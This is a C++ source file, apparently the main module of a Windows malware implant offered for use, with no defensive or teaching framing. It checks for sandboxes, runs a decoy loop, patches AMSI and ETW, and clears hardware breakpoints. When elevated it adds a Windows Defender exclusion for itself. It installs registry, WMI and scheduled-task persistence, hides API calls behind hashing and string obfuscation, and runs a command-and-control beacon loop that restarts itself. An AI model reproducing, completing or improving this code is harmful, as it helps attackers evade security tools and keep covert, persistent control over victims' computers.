#include <windows.h>
#include <shellapi.h>
#include <algorithm>
#include <stdarg.h>
#include "syscalls.hpp"
#include "evasion.hpp"
#include "c2.hpp"
#include "utils.hpp"
#include "persistence.hpp"
#include "injection.hpp"
#include "obfuscate.hpp"

// ─── Debug log — pure Win32, no CRT, works from first instruction ─────────────
#ifdef DEBUG
static void DBG(const char* fmt, ...) {
    char buf[512];
    va_list va;
    va_start(va, fmt);
    wvsprintfA(buf, fmt, va);
    va_end(va);
    lstrcatA(buf, "\r\n");
    OutputDebugStringA(buf);
    HANDLE hf = CreateFileA("C:\\Users\\Public\\ghost_debug.log",
        FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf != INVALID_HANDLE_VALUE) {
        DWORD w; WriteFile(hf, buf, (DWORD)lstrlenA(buf), &w, NULL);
        CloseHandle(hf);
    }
}
#else
#define DBG(...) do {} while(0)
#endif

static void NtSleep(DWORD ms) {
    typedef NTSTATUS(NTAPI* Fn)(BOOLEAN, PLARGE_INTEGER);
    static Fn pfn = nullptr;
    if (!pfn) {
        HMODULE h = GetModuleHandleA(XS("ntdll.dll"));
        if (h) pfn = reinterpret_cast<Fn>(HashProc(h, FNV("NtDelayExecution")));
    }
    if (pfn) {
        LARGE_INTEGER li;
        li.QuadPart = -static_cast<LONGLONG>(ms) * 10000LL;
        pfn(FALSE, &li);
    } else {
        Sleep(ms);
    }
}

static void DecoyLoop() {
    volatile unsigned long long fib = 1, a = 0, b = 1;
    for (int i = 0; i < 5000000; i++) { fib = a + b; a = b; b = fib; }
}

DWORD WINAPI ImplantThread(LPVOID) {
    DBG("ImplantThread start pid=%lu", GetCurrentProcessId());

#ifndef DEBUG
    if (SandboxCheck()) {
        DBG("sandbox detected");
        DeepSleep();
        return 1;
    }
#endif

    DBG("DecoyLoop");
    DecoyLoop();
    DBG("DecoyLoop done");

    DBG("InitializeSyscalls");
    try {
        int n = 0;
        while (!InitializeSyscalls()) {
            DBG("InitializeSyscalls fail attempt %d", ++n);
            if (n >= 5) return 1;
            NtSleep(5000);
        }
    } catch(...) {
        DBG("InitializeSyscalls EXCEPTION");
        return 1;
    }
    DBG("InitializeSyscalls ok");

    try { PatchAMSI(); } catch(...) { DBG("PatchAMSI EXCEPTION"); }
    try { PatchETW(); } catch(...) { DBG("PatchETW EXCEPTION"); }
    try { ClearHardwareBreakpoints(); } catch(...) { DBG("ClearHWBP EXCEPTION"); }
    DBG("evasion done");

    wchar_t exePath[MAX_PATH] = {};
    GetModuleFileNameW(NULL, exePath, MAX_PATH);

    if (IsElevated()) {
        try { AddDefenderExclusion(exePath); } catch(...) { DBG("DefenderExclusion EXCEPTION"); }
    }
    DBG("defender exclusion done, elevated=%d", (int)IsElevated());

    DBG("persistence: registry start");
    try { InstallRegistryPersistence(exePath); } catch(...) { DBG("registry EXCEPTION"); }
    DBG("persistence: registry done");

    // WMI + schtask run async — ConnectServer can hang indefinitely on busy WMI
    struct PersistCtx { wchar_t path[MAX_PATH]; };
    auto* ctx = new PersistCtx{};
    wcscpy_s(ctx->path, exePath);
    CreateThread(nullptr, 0, [](LPVOID p) -> DWORD {
        auto* c = static_cast<PersistCtx*>(p);
        try {
            if (!IsWmiPersistenceInstalled()) {
                InstallWmiPersistence(c->path);
                InstallWmiScriptPersistence(c->path);
            }
            if (!IsScheduledTaskInstalled())
                InstallScheduledTaskPersistence(c->path);
        } catch(...) {}
        delete c;
        return 0;
    }, ctx, 0, nullptr);
    DBG("persistence done (WMI/schtask async)");

    DBG("BeaconLoop start");
    try {
        BeaconLoop();
    } catch(...) {
        DBG("BeaconLoop EXCEPTION");
        return 1;
    }
    DBG("BeaconLoop returned");
    return 0;
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
    // ponytail: manifest sets requireAdministrator — Windows handles UAC at launch,
    // no ShellExecuteExW runas needed. Single process, always elevated here.
    DBG("===== WinMain pid=%lu elevated=%d =====",
        GetCurrentProcessId(), (int)IsElevated());

    SetErrorMode(SEM_NOGPFAULTERRORBOX | SEM_FAILCRITICALERRORS);

    HMODULE hK32 = GetModuleHandleA(XS("kernel32.dll"));
    if (!hK32) { DBG("kernel32 null"); return 0; }

    auto _CreateThread        = HASHPROC(hK32, CreateThread);
    auto _WaitForSingleObject = HASHPROC(hK32, WaitForSingleObject);
    auto _CloseHandle         = HASHPROC(hK32, CloseHandle);
    auto _GetExitCodeThread   = HASHPROC(hK32, GetExitCodeThread);

    DBG("procs CT=%lu WFSO=%lu CH=%lu GECT=%lu",
        (DWORD)(DWORD_PTR)_CreateThread,
        (DWORD)(DWORD_PTR)_WaitForSingleObject,
        (DWORD)(DWORD_PTR)_CloseHandle,
        (DWORD)(DWORD_PTR)_GetExitCodeThread);

    if (!_CreateThread || !_WaitForSingleObject || !_CloseHandle || !_GetExitCodeThread) {
        DBG("HASHPROC failed");
        return 0;
    }

    DWORD restartCount = 0;
    while (true) {
        if (restartCount > 0) {
            DWORD backoff = std::min(5000UL * (1UL << (restartCount - 1)), 60000UL);
            DBG("backoff %lums restart#%lu", backoff, restartCount);
            Sleep(backoff);
        }
        DBG("spawning ImplantThread #%lu", restartCount);
        HANDLE hThread = _CreateThread(NULL, 0, ImplantThread, NULL, 0, NULL);
        if (!hThread) {
            DBG("CreateThread failed err=%lu", GetLastError());
            Sleep(5000); ++restartCount; continue;
        }
        _WaitForSingleObject(hThread, INFINITE);
        DWORD code = 0;
        _GetExitCodeThread(hThread, &code);
        _CloseHandle(hThread);
        DBG("ImplantThread exit code=%lu", code);
        if (code == 0) { DBG("clean exit"); return 0; }
        ++restartCount;
    }
}
